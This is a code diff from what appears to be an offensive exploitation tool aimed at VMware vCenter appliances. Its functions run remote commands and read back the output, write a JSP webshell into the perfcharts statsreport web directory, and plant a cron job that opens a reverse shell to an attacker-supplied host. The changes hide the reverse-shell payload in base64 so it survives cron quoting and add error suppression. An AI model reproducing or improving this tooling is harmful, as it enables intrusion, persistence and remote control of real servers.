@@ -147,7 +147,7 @@ def rce_readback(host, port, cmd, tag, tcp=False, tls=False, vami_port=5480,
             return False, "已取消"
         st, url, body_b = vami_fetch(host, "r%s.txt" % tag, vami_port, timeout=8,
                                      proxy=proxy)
-        if st == 200 and body_b:
+        if st == 200:
             return True, body_b.decode("utf-8", "replace")
         if poll_cb:
             poll_cb("[*] 轮询 %s → %s" % (url, st))
@@ -180,7 +180,8 @@ def drop_webshell(host, port, name, tcp=False, tls=False, timeout=8):
     written, _ = write_file(host, port, tmp, WEBSHELL_JSP.decode(), vector="app",
                             tcp=tcp, tls=tls, timeout=timeout)
     body = ("/bin/sh -c 'cp /tmp/ws%s-syslog.log "
-            "/usr/lib/vmware-perfcharts/tc-instance/webapps/statsreport/%s.jsp;"
+            "/usr/lib/vmware-perfcharts/tc-instance/webapps/statsreport/%s.jsp "
+            "2>/dev/null;"
             "cp /tmp/ws%s-syslog.log "
             "/usr/lib/vmware-perfcharts/webapps/statsreport/%s.jsp 2>/dev/null'"
             % (name, name, name, name))
@@ -198,10 +199,16 @@ REVSH_PY = ("python3 -c 'import socket,subprocess,os;s=socket.socket();"
 
 def plant_revshell(host, port, lhost, lport, method="bash", name=None,
                    tcp=False, tls=False, timeout=8):
-    """植入反弹 shell 的 cron 载荷（监听端见 c2 模块）。"""
+    """植入反弹 shell 的 cron 载荷（监听端见 c2 模块）。
+
+    载荷整体 base64 封装后经 /bin/bash 执行：python 载荷内含单/双引号，
+    直接嵌进 cron 第 6 列会被 shell 错误切分；b64 字符集引号安全。
+    """
     if name is None:
         from .util import rand_name
         name = rand_name()
     tmpl = REVSH_BASH if method == "bash" else REVSH_PY
-    body = "/bin/bash -c '%s'" % tmpl.format(lhost=lhost, lport=lport)
+    payload = tmpl.format(lhost=lhost, lport=lport)
+    b64 = base64.b64encode(payload.encode()).decode()
+    body = "/bin/sh -c 'echo %s | base64 -d | /bin/bash'" % b64
     return plant_cron(host, port, body, name, tcp=tcp, tls=tls, timeout=timeout)
